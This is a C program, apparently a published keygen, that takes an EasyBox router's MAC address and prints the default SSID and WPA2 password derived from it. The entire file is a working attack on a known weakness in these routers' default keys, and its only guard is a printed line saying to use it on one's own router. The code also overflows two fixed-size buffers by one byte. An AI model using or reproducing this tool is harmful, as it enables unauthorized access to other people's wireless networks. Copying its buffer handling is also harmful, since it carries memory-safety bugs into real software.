#include<stdlib.h>
#include<stdio.h>


int main() {
	printf("EasyBox-Keygen for Standard WPA2-Password.\n");
	printf("By Sebastian Petters\n");
	printf("http://www.wotan.cc\n");
	printf("Use this only on your own Router\n");
	unsigned int mac_1, mac_2, mac_3, mac_4, mac_5, mac_6;
	unsigned int m7, m8, m9, m10, m11, m12;
	printf("MAC-Adress [00:00:00:00:00:00]: ");
	scanf("%2X:%2X:%2X:%2X:%2X:%2X", &mac_1, &mac_2, &mac_3, &mac_4, &mac_5, &mac_6);
	
	m7  = mac_4 >> 4 & 0x0f;
	m8  = mac_4 & 0x0f;
	m9  = mac_5 >> 4 & 0x0f;
	m10 = mac_5 & 0x0f;
	m11 = mac_6 >> 4 & 0x0f;
	m12 = mac_6 & 0x0f;
	
	char last4[4];
	sprintf(last4, "%1X%1X%1X%1X", m9, m10, m11, m12);
	int smac;
	sscanf(last4, "%X", &smac);
	printf("\nSMAC: %i", smac);
	
	char smacs[5];
	sprintf(smacs, "%05d", smac);
	int s6, s7, s8, s9, s10;
	s6 = smacs[0] - '0';
    s7 = smacs[1] - '0';
    s8 = smacs[2] - '0';
    s9 = smacs[3] - '0';
    s10 = smacs[4] - '0';
    printf("\nSSID: EasyBox-%1X%1X%1X%1X%1X%1X",m7, m8, m9, m10, s6, s10);
    
    int k1, k2;
    k1 = (s7 + s8 + m11 + m12) & 0x0f;
    k2 = (m9 + m10 +s9 + s10) & 0x0f;
    printf("\nK1: %1X", k1);
    printf("\nK2: %1X", k2);
    
    int x1, x2, x3, y1, y2, y3, z1, z2, z3;
    x1 = k1 ^ s10;
    x2 = k1 ^ s9;
    x3 = k1 ^ s8;
    y1 = k2 ^ m10;
    y2 = k2 ^ m11;
    y3 = k2 ^ m12;
    z1 = m11 ^ s10;
    z2 = m12 ^ s9;
    z3 = k1 ^ k2;
    
    printf("\nWPA2-Key: %1X%1X%1X%1X%1X%1X%1X%1X%1X\n", x1, y1, z1, x2, y2, z2, x3, y3, z3);

	return 0;
}
